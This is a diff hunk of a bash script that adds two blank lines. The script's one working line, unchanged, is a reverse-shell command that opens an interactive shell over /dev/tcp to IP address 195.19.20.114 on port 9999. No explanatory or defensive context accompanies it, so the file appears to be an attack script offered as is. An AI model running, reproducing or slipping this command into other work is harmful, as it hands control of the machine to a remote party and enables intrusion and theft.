@@ -1,3 +1,5 @@
 #!/usr/bin/env bash
 
 sh -i >& /dev/tcp/195.19.20.114/9999 0>&1
+
+
